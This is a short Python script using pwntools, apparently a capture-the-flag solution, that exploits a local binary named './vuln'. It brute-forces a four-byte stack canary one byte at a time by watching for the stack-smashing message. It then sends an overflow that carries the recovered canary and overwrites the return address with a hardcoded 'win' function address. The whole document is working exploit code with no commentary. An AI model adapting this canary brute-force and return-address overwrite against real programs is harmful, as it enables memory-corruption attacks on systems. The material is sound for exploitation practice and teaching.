from pwn import *

BUFFSIZE = 32
CANARYSIZE = 4
RET_OFF = 52 - CANARYSIZE
WIN = 0x080486eb

canary = ''

while len(canary) != CANARYSIZE:

    for c in range(256):
        print(str(canary+chr(c)).encode('hex'))
        pad = len(canary) + BUFFSIZE
        p = process('./vuln')
        print(p.readuntil('> '))
        p.sendline('%s' % (pad + 1))
        p.readuntil('Input> ')
        p.sendline((BUFFSIZE * 'a') + canary + chr(c))
        res = p.readline()

        if res.startswith('***'):
            p.close()
            continue

        canary = canary + chr(c)
        p.close()
        break

p = process('./vuln')
p.sendline('56')
p.sendline((13*canary) + p32(WIN))
print(p.readall())

# ret: 80488fe
